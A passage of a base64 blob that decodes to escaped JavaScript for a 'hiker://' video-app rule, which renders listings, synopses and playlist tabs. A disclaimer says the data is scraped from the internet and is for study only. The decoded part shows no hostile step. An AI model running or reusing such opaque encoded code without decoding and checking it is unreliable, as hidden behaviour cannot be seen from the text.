AgICAgdmFyIG5ld09iaiA9IE9iamVjdC5hc3NpZ24oe30sIG9iaik7XFxcXG4gICAgICAgICAgICBpZiAobmV3T2JqLmhhc093blByb3BlcnR5KCd0eXBlJykpIHtcXFxcbiAgICAgICAgICAgICAgICBuZXdPYmouY29sX3R5cGUgPSBuZXdPYmoudHlwZTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBuZXdPYmo7XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gbmV3Y2xzbGlzdDtcXFxcbiAgICB9LFxcXFxuICAgIHByZUxvYWQ6IGZ1bmN0aW9uKGZ1bmMpIHtcXFxcbiAgICAgICAgbGV0IG15ZnVuYz1udWxsXFxcXG4gICAgICAgIGlmKGZ1bmMhPXVuZGVmaW5lZCYmZnVuYy5jb25zdHJ1Y3Rvcj09RnVuY3Rpb24pe1xcXFxuICAgICAgICAgICAgbXlmdW5jPWZ1bmNcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICAkLmV4dGVuZCh7XFxcXG4gICAgICAgICAgICBkYXRhQ29udmVydDogdGhpcy5kYXRhQ29udmVydCxcXFxcbiAgICAgICAgICAgIG1zbTpNZXRob2RzLk11bHRpU2VsZWN0TW9kZSxcXFxcbiAgICAgICAgICAgIGZ1bmM6bXlmdW5jLFxcXFxuICAgICAgICB9KVxcXFxuICAgIH0sXFxcXG4gICAgc21hbGw6IGZ1bmN0aW9uKHN0ciwgY29sb3IpIHtcXFxcbiAgICAgICAgcmV0dXJuICfigJjigJjigJnigJk8c21hbGw+PGZvbnQgY29sb3I9XFxcXFxcXCInICsgKGNvbG9yIHx8ICcnKSArICdcXFxcXFxcIj4nICsgc3RyICsgJzwvZm9udD48L3NtYWxsPic7XFxcXG4gICAgfSxcXFxcbiAgICDlo7DmmI46IGZ1bmN0aW9uKCkge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IHRoaXMuc21hbGwoJ+S7peS4iuaVsOaNruadpea6kOS6jue9kee7nO+8jOWmguaCqOWWnOasou+8jOivt+aUr+aMgeWumOaWue+8gScsICcjODcxRjc4JyksXFxcXG4gICAgICAgICAgICBkZXNjOiB0aGlzLnNtYWxsKCfmraTop4TliJnku4XpmZDlrabkuaDkuqTmtYHkvb/nlKjvvIzor7fkuo7lr7zlhaXlkI4yNOWwj+aXtuWGheWIoOmZpO+8jOS7u+S9lee7hOe7h+aIluS4quS6uuS4jeW+l+S7peS7u+S9leaWueW8j+aWueazleS8oOaSreatpOinhOWImeeahOaVtOS9k+aIlumDqOWIhu+8gScsICcjRjIwQzAwJyksXFxcXG4gICAgICAgICAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfSxcXFxcblxcXFxuXFxcXG4vL+eugOS7i1xcXFxuICAgIHNldERlc2M6IGZ1bmN0aW9uKGRlc2MsIG51bSkge1xcXFxuICAgICAgICBkZXNjID0gZGVzYy5jb25zdHJ1Y3RvciA9PSBBcnJheSA/IGRlc2Muam9pbignPGJyPicpIDogZGVzYztcXFxcbiAgICAgICAgaWYgKGRlc2MucmVwbGFjZSgvKDxicj58XFxcXFxcXFxzKykvZywgJycpLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgICAgICAgICByZXR1cm5cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICB2YXIgaW5mbz1zdG9yYWdlMC5nZXRNeVZhcignZXJfaW5mbycsJ3t9JylcXFxcbiAgICAgICAgaWYoaW5mb1snZGVzYyddIT11bmRlZmluZWQpe1xcXFxuICAgICAgICAgIGluZm9bJ2Rlc2MnXT1pbmZvWydkZXNjJ10rJyDnroDku4s6JytkZXNjO1xcXFxuICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKCdlcl9pbmZvJyxpbmZvKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBcXFxcbiAgICAgICAgY29uc3QgbWFyayA9ICdkZXNjJztcXFxcbiAgICAgICAgbnVtID0gdHlwZW9mKG51bSkgPT0gJ3VuZGVmaW5lZCcgPyA5MCA6IG51bVxcXFxuICAgICAgICBkZXNjID0gZGVzYy5zdGFydHNXaXRoKCfjgIDjgIAnKSA/IGRlc2MgOiAn44CA44CAJyArIGRlc2M7XFxcXG4gICAgICAgIGRlc2MgPSBkZXNjLnJlcGxhY2UoLycvZywgXFxcXFxcXCImIzM5O1xcXFxcXFwiKVxcXFxuXFxcXG4gICAgICAgIGZ1bmN0aW9uIHN1YnN0cihzdHIsIG1heExlbmd0aCkge1xcXFxuICAgICAgICAgICAgbGV0IGxlbiA9IDA7XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHN0ci5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGlmIChzdHIuY2hhckNvZGVBdChpKSA+IDI1NSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZW4gKz0gMjtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZW4rKztcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKGxlbiA+IG1heExlbmd0aCkge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3RyLnNsaWNlKDAsIGkpICsgJy4uLic7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIHN0cjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgc2Rlc2MgPSBzdWJzdHIoZGVzYywgbnVtKTtcXFxcbiAgICAgICAgdmFyIGxhenkgPSAkKGAjbm9Mb2FkaW5nI2ApLmxhenlSdWxlKChkYywgc2RjLCBtKSA9PiB7XFxcXG4gICAgICAgICAgICB2YXIgc2hvdyA9IHN0b3JhZ2UwLmdldEl0ZW0obSwgJzAnKTtcXFxcbiAgICAgICAgICAgIHZhciB0aXRsZSA9IGZpbmRJdGVtKCdkZXNjJykudGl0bGU7XFxcXG4gICAgICAgICAgICB2YXIgcmUgPSAvKDxcXFxcXFxcXC9zbWFsbD48YnI+Lio/PikuKy9nO1xcXFxuICAgICAgICAgICAgdmFyIGV4cCA9ICflsZXlvIA6JztcXFxcbiAgICAgICAgICAgIHZhciByZXQgPSAn5pS26LW3Oic7XFxcXG4gICAgICAgICAgICBpZiAoc2hvdyA9PSAnMScpIHtcXFxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKCdkZXNjJywge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGVcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKHJldCwgZXhwKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UocmUsICckMScgKyBzZGMgKyAnPC9zbWFsbD4nKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyg8XFxcXFxcXFwvc21hbGw+PGJyPjxmb250IGNvbG9yPVxcXFxcXFwiKS4qPyhcXFxcXFxcIj4pLywgJyQxIzhBMkJFMiQyJykvL+aUtui1t+minOiJslxcXFxuXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKG0sICcwJyk7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oJ2Rlc2MnLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoZXhwLCByZXQpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAucmVwbGFjZShyZSwgJyQxJyArIGRjICsgJzwvc21hbGw+JylcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8oPFxcXFxcXFxcL3NtYWxsPjxicj48Zm9udCBjb2xvcj1cXFxcXFxcIikuKj8oXFxcXFxcXCI+KS8sICckMSMwMDgwMDAkMicpLy/lsZXlvIDpopzoibJcXFxcbiAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0obSwgJzEnKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBgaGlrZXI6Ly9lbXB0eWBcXFxcbiAgICAgICAgfSwgZGVzYywgc2Rlc2MsIG1hcmspXFxcXG4gICAgICAgIHZhciBzYyA9IHN0b3JhZ2UwLmdldEl0ZW0obWFyaywgJzAnKSA9PSAnMCcgPyAn5bGV5byAOicgOiAn5pS26LW3Oic7XFxcXG4gICAgICAgIHZhciBkYyA9IHN0b3JhZ2UwLmdldEl0ZW0obWFyaywgJzAnKSA9PSAnMCcgPyBzZGVzYyA6IGRlc2M7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiAnJyArICc8Yj48Zm9udCBjb2xvcj1cXFxcXFxcIiMwOThBQzFcXFxcXFxcIj7iiLcgIOWJp+aDheeugOS7i1xcXFx0PC9mb250PjwvYj4nICsgXFxcXFxcXCI8c21hbGw+PGEgc3R5bGU9J3RleHQtZGVjb3JhdGlvbjogbm9uZTsnIGhyZWY9J1xcXFxcXFwiICsgbGF6eSArIFxcXFxcXFwiJz5cXFxcXFxcIiArIHNjICsgJzwvYT48L3NtYWxsPjxicj48Zm9udCBjb2xvcj1cXFxcXFxcIiM4QTJCRTJcXFxcXFxcIj4nICsgYCR7ZGN9YCArICc8L3NtYWxsPicsLy/pu5jorqTpopzoibJcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6ICdkZXNjJyxcXFxcbiAgICAgICAgICAgICAgICBsaW5lU3BhY2luZzogNixcXFxcbiAgICAgICAgICAgICAgICB0ZXh0U2l6ZTogMTUsXFxcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IHRydWUsXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcblxcXFxuXFxcXG4vL+a1t+aKpVxcXFxuICAgIHN0ckNvbnZlcnQ6IGZ1bmN0aW9uKGFycikge1xcXFxuICAgICAgICByZXR1cm4gYXJyLm1hcCh4ID0+IHtcXFxcbiAgICAgICAgICAgIHN0ciA9IHg7XFxcXG4gICAgICAgICAgICBpZiAoLyjlr7zmvJR85Li75ryUfOexu+WeiynvvJovLnRlc3Qoc3RyKSkge1xcXFxuICAgICAgICAgICAgICAgIHN0ciA9IHN0ci5zcGxpdCgnLycpLm1hcCgodmFsLCBpbmRleCkgPT4gKGluZGV4ID09PSAwID8gJycgOiAnJykgKyB2YWwpLnNsaWNlKDAsIDUpLmpvaW4oJyAnKS5yZXBsYWNlKC8gJC8sICcnKTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBzdHJcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIHNldENvbnRlbnQ6IGZ1bmN0aW9uKG9iaikge1xcXFxuICAgICAgICAvL2xvZyhvYmopXFxcXG4gICAgICAgIHZhciBjb250ZW50cyA9IG9iai5tYWluO1xcXFxuICAgICAgICB2YXIgc29ydE9yZGVyID0gb2JqLnNvcnQ7XFxcXG4gICAgICAgIHZhciBpbWcgPSBvYmouaW1nO1xcXFxuICAgICAgICB2YXIgdGV4dHMgPSBjb250ZW50cy5tYXAoeCA9PiBwZGZoKHgsICdUZXh0JykpO1xcXFxuICAgICAgICBcXFxcbiAgICAgICAgdmFyIGFycmF5ID0gdGV4dHMuc29ydCgoYSwgYikgPT4ge1xcXFxuICAgICAgICAgICAgY29uc3QgaW5kZXhBID0gc29ydE9yZGVyLmluZGV4T2YoYS5zdWJzdHIoMCwgMikpO1xcXFxuICAgICAgICAgICAgY29uc3QgaW5kZXhCID0gc29ydE9yZGVyLmluZGV4T2YoYi5zdWJzdHIoMCwgMikpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIGluZGV4QSAtIGluZGV4QjtcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgdmFyIHJlZ2V4ID0gbmV3IFJlZ0V4cCgnKCcgKyBzb3J0T3JkZXIuam9pbignfCcpICsgJyknKTtcXFxcbiAgICAgICAgYXJyYXkgPSBhcnJheS5maWx0ZXIoZnVuY3Rpb24oaXRlbSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHJlZ2V4LnRlc3QoaXRlbSk7XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICAvL2xvZyhhcnJheSlcXFxcbiAgICAgICAgXFxcXG4gICAgICAgIC8vYXJyYXkgPSBzb3J0T3JkZXIubGVuZ3RoPT0wP2FycmF5OnRoaXMuc3RyQ29udmVydChhcnJheSk7XFxcXG4gICAgICAgIGFycmF5ID0gdGhpcy5zdHJDb252ZXJ0KGFycmF5KTtcXFxcbiAgICAgICAgXFxcXG4gICAgICAgIGlmKGFycmF5Lmxlbmd0aD42KXtcXFxcbiAgICAgICAgICAgIGFycmF5PWFycmF5LnNsaWNlKDAsNik7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgXFxcXG4gICAgICAgIHZhciB0aXRsZXMgPSBbXTtcXFxcbiAgICAgICAgdmFyIGRlc2NzID0gW107XFxcXG4gICAgICAgIFxcXFxuICAgICAgICBzd2l0Y2ggKGFycmF5Lmxlbmd0aCkge1xcXFxuICAgICAgICAgICAgY2FzZSA0OlxcXFxuICAgICAgICAgICAgY2FzZSA1OlxcXFxuICAgICAgICAgICAgICAgIHRpdGxlcyA9IGFycmF5LnNsaWNlKDAsIDIpO1xcXFxuICAgICAgICAgICAgICAgIGRlc2NzID0gYXJyYXkuc2xpY2UoMik7XFxcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICBjYXNlIDY6XFxcXG4gICAgICAgICAgICAgICAgdGl0bGVzID0gYXJyYXkuc2xpY2UoMCwgMyk7XFxcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgzKTtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcignZXJfaW5mbycse1xcXFxuICAgICAgICAgIGRlc2M6ZGVzY3Muam9pbignXFxcXFxcXFxuJyksXFxcXG4gICAgICAgICAgaW1nOmltZyxcXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiAgdGhpcy5zbWFsbCh0aXRsZXNbMF0gKyAnXFxcXFxcXFxuJyArdGl0bGVzLnNsaWNlKDEsIDMpLmpvaW4oJ1xcXFxcXFxcbicpLCdyZWQnKSxcXFxcbiAgICAgLy90aXRsZTogIHRoaXMuc21hbGwocGRmaChodG1sLCAnLmRhdGE6Y29udGFpbnMo5pu05pawKSYmVGV4dCcpICsgJ1xcXFxcXFxcbicgKyBwZGZoKGh0bWwsICcuZGF0YTpjb250YWlucyjnsbvlnospJiZUZXh0JyksJ3JlZCcpLFxcXFxuICAgICAgICAgZGVzYzogdGhpcy5zbWFsbChkZXNjcy5qb2luKCdcXFxcXFxcXG4nKSwnI0ZGN0YwMCcpLFxcXFxuICAgICAgLy9kZXNjOiB0aGlzLnNtYWxsKHBkZmgoaHRtbCwgJy5kYXRhOmNvbnRhaW5zKOWvvOa8lCkmJlRleHQnKSArICdcXFxcXFxcXG4nICsgcGRmaChodG1sLCAnLmRhdGE6Y29udGFpbnMo5Li75ryUKSYmVGV4dCcpLCcjRkY3RjAwJyksXFxcXG4gICAgIC8vZGVzYzogdGhpcy5zbWFsbChwZGZoKGh0bWwsICcuZGF0YTpjb250YWlucyjmm7TmlrApJiZUZXh0JyksJyNGRjdGMDAnKSxcXFxcbiAgICAgICAgICAgIHBpY191cmw6IGltZyArICdAUmVmZXJlcj0nLFxcXFxuICAgICAgICAgICAgdXJsOiBNWV9VUkwsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzFfdmVydGljYWxfcGljX2JsdXInLFxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBpZiAob2JqLmRlc2MgIT0gdW5kZWZpbmVkKSB7XFxcXG4gICAgICAgICAgICB0aGlzLnNldERlc2Mob2JqLmRlc2MpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICBzZXRDdXN0b206IGZ1bmN0aW9uKG9iaiwgaW1nKSB7XFxcXG4gICAgICAgIHZhciBhcnJheSA9IFtdO1xcXFxuICAgICAgICBpZiAob2JqLmNvbnN0cnVjdG9yID09IEFycmF5KSB7XFxcXG4gICAgICAgICAgICBhcnJheSA9IG9iajtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBhcnJheSA9IHRoaXMuc3RyQ29udmVydChhcnJheSk7XFxcXG4gICAgICAgIHZhciB0aXRsZXMgPSBbXTtcXFxcbiAgICAgICAgdmFyIGRlc2NzID0gW107XFxcXG4gICAgICAgIHN3aXRjaCAoYXJyYXkubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICBjYXNlIDQ6XFxcXG4gICAgICAgICAgICBjYXNlIDU6XFxcXG4gICAgICAgICAgICAgICAgdGl0bGVzID0gYXJyYXkuc2xpY2UoMCwgMik7XFxcXG4gICAgICAgICAgICAgICAgZGVzY3MgPSBhcnJheS5zbGljZSgyKTtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIGNhc2UgNjpcXFxcbiAgICAgICAgICAgICAgICB0aXRsZXMgPSBhcnJheS5zbGljZSgwLCAzKTtcXFxcbiAgICAgICAgICAgICAgICBkZXNjcyA9IGFycmF5LnNsaWNlKDMpO1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKCdlcl9pbmZvJyx7XFxcXG4gICAgICAgICAgZGVzYzpkZXNjcy5qb2luKCdcXFxcXFxcXG4nKSxcXFxcbiAgICAgICAgICBpbWc6aW1nLFxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlc1swXSArICdcXFxcXFxcXG4nICsgdGhpcy5zbWFsbCh0aXRsZXMuc2xpY2UoMSwgMykuam9pbignXFxcXFxcXFxuJykpLFxcXFxuICAgICAgICAgICAgZGVzYzogdGhpcy5zbWFsbChkZXNjcy5qb2luKCdcXFxcXFxcXG4nKSksXFxcXG4gICAgICAgICAgICBwaWNfdXJsOiBpbWcgKyAnQFJlZmVyZXI9JyxcXFxcbiAgICAgICAgICAgIHVybDogTVlfVVJMLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpY19ibHVyJyxcXFxcbiAgICAgICAgfSlcXFxcbiAgICB9LFxcXFxuICAgIGlzQ29sb3I6ZnVuY3Rpb24odGV4dCkge1xcXFxuICAgICBjb25zdCByZWdleCA9IC9eIyhbMC05QS1GYS1mXXszfXxbMC05QS1GYS1mXXs2fSkkfF4oW2Etel0rKSQvaTtcXFxcbiAgICAgcmV0dXJuIHJlZ2V4LnRlc3QodGV4dCk7XFxcXG4gICAgfSxcXFxcbiAgICBnZXRQcmVzZXQ6ZnVuY3Rpb24oY3VzdG9tKXtcXFxcbiAgICAgIGlmKHR5cGVvZiBjdXN0b21kYXRhPT0nb2JqZWN0JyYmIWN1c3RvbSl7XFxcXG4gICAgICAgIGN1c3RvbT1jdXN0b21kYXRhO1xcXFxuICAgICAgfWVsc2V7XFxcXG4gICAgICAgIGN1c3RvbT1jdXN0b20/Y3VzdG9tOnt9XFxcXG4gICAgICB9XFxcXG4gICAgICBjdXN0b20u5q2j5bqP6aKc6ImyPShjdXN0b20u5q2j5bqP6aKc6ImyJiZ0aGlzLmlzQ29sb3IoY3VzdG9tLuato+W6j+minOiJsikpP2N1c3RvbS7mraPluo/popzoibI6JyMxQUFEMTknO1xcXFxuICAgICAgY3VzdG9tLumAhuW6j+minOiJsj0oY3VzdG9tLumAhuW6j+minOiJsiYmdGhpcy5pc0NvbG9yKGN1c3RvbS7pgIbluo/popzoibIpKT9jdXN0b20u6YCG5bqP6aKc6ImyOicjRkYwMDAwJztcXFxcbiAgICAgIGN1c3RvbS7lm77moIc9Y3VzdG9tLuWbvuaghz9jdXN0b20u5Zu+5qCHOidodHRwczovL2kyLjEwMDAyNC54eXovMjAyMy8wNi8xMC9oNHo2Mjcud2VicCc7XFxcXG4gICAgICBjdXN0b20u57q/6Lev6YCJ5LitPWN1c3RvbS7nur/ot6/pgInkuK0/Y3VzdG9tLue6v+i3r+mAieS4rTonIzAwOEI4Qic7XFxcXG4gICAgICByZXR1cm4gY3VzdG9tO1xcXFxuICAgIH0sXFxcXG4gICAgY3JlYXRlUExpc3Q6IGZ1bmN0aW9uKHRhYnMsdmFyaSxzaHNvcnQsY3VzdG9tKXtcXFxcbiAgICAgIHZhcmk9XFxcXFxcXCJlcl9cXFxcXFxcIit2YXJpO1xcXFxuICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0YWJzLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICB2YXIgdXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodmFyaSwgc2hzb3J0LCBpLGxpbmVjKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICB2YXIgbGlzdHMgPSBzdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQgKyAnX2xpc3QnLCAnW10nKTtcXFxcbiAgICAgICAgICAgICAgICBcXFxcbiAgICAgICAgICAgICAgaWYoZ2V0TXlWYXIodmFyaSsnZm9sZCcsJzEnKT09JzAnKXtcXFxcbiAgICAgICAgICAgICAgICB2YXIgYnRuPWZpbmRJdGVtKHNoc29ydCsnX2J1dHRvbicpO1xcXFxuICAgICAgICAgICAgICAgIHZhciBmb2xkcz1bJzxmb250IGNvbG9yPVxcXFxcXFwiI0QzRDNEM1xcXFxcXFwiPuKYtycsJzxmb250IGNvbG9yPVxcXFxcXFwiI0ZGQTUwMFxcXFxcXFwiPuKYsCddO1xcXFxuICAgICAgICAgICAgICAgICAgdmFyIHBsaXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ2VyX3BsYXlsaXN0cycsICd7fScpO1xcXFxuICAgICAgICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICAgICAgICB2YXIgY29sID0gcGxpc3Rbc2hzb3J0XS5jb2xfdHlwZTtcXFxcbiAgICAgICAgICAgICAgICAgIHZhciBjbHMgPSBwbGlzdFtzaHNvcnRdLmNscztcXFxcbiAgICAgICAgICAgICAgICAgIHZhciBwaWM9cGxpc3Rbc2hzb3J0XS5waWM7XFxcXG4gICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKGJ0bi5leHRyYS5pZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogYnRuLnRpdGxlLnJlcGxhY2UoZm9sZHNbMF0sIGZvbGRzWzFdKSxcXFxcbiAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgICBcXFxcbiAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHZhcmkrJ2ZvbGQnLCcxJyk7XFxcXG4gICAgICAgICAgICAgIC8vcmV0dXJuICd0b2FzdDovL+WxleW8gOaJjeiDveaTjeS9nCc7XFxcXG4gICAgICAgICAgICAgICAgIH1lbHNle1xcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgcGxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcignZXJfcGxheWxpc3RzJywgJ3t9Jyk7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgY29sID0gcGxpc3Rbc2hzb3J0XS5jb2xfdHlwZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIGNscyA9IHBsaXN0W3Noc29ydF0uY2xzO1xcXFxuICAgICAgICAgICAgICAgICAgICB2YXIgcGljPXBsaXN0W3Noc29ydF0ucGljO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcih2YXJpLCBpKTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIHZhciB4bGlzdD1saXN0c1tpXTtcXFxcbiAgICAgICAgICAgICAgICBpZigkLmZ1bmMhPXVuZGVmaW5lZCYmJC5mdW5jLmNvbnN0cnVjdG9yPT1GdW5jdGlvbil7XFxcXG4gICAgICAgICAgICAgICAgICAgIHhsaXN0PSQuZnVuYyhpKTtcXFxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQgKyAnX2xpc3QnLCB4bGlzdCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHZhciBwbGF5cyA9IHhsaXN0Lm1hcCh4ID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB4LnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiB4LnVybCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBjb2wsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBwaWM6cGljLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZDogeC51cmwucmVwbGFjZSgvQGxhenlSdWxlW1xcXFxcXFxcc1xcXFxcXFxcU10rL2csICcnKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbHM6IGNscyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgaWYgKGdldE15VmFyKHNoc29ydCArICdfc29ydCcpID09ICcxJykge1xcXFxuICAgICAgICAgICAgICAgICAgICBwbGF5cy5yZXZlcnNlKCk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHZhciBwY2ZnPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCsnX3B1c2hjZmcnLCd7fScpO1xcXFxuICAgICAgICAgICAgICAgIGlmKHBjZmdbJ+WNleaOqCddKXtcXFxcbiAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaCcse1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTpwY2ZnWydvYmonXVsn5Y2V5o6oJ11bMF1cXFxcbiAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgICBwY2ZnWyfljZXmjqgnXT1mYWxzZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYocGNmZ1sn6YCJ5o6oJ10pe1xcXFxuICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQrJ19wdXNocycse1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTpwY2ZnWydvYmonXVsn6YCJ5o6oJ11bMF1cXFxcbiAgICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT1mYWxzZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoc2hzb3J0KydfcHVzaGNmZycscGNmZyk7XFxcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKHNoc29ydCk7XFxcXG4gICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKHNoc29ydCArICdfbGluZScsIHBsYXlzKTtcXFxcblxcXFxuICAgICAgICAgICAgICAgIHZhciB0YWJ4ID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0ICsgJ190YWInKTtcXFxcbiAgICAgICAgICAgICAgICB0YWJ4LmZvckVhY2goKHgsIGlpKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHZhciB0aXRsZSA9IHgudGl0bGU7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmIChpID09IGlpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0bGUucmVwbGFjZSgvIyhcXFxcXFxcXHcrKT8vZywgbGluZWMpLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oeC5leHRyYS5pZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZS5yZXBsYWNlKC8jKFxcXFxcXFxcdyspPy9nLCAnIycpLFxcXFxuICAgICAgICAgI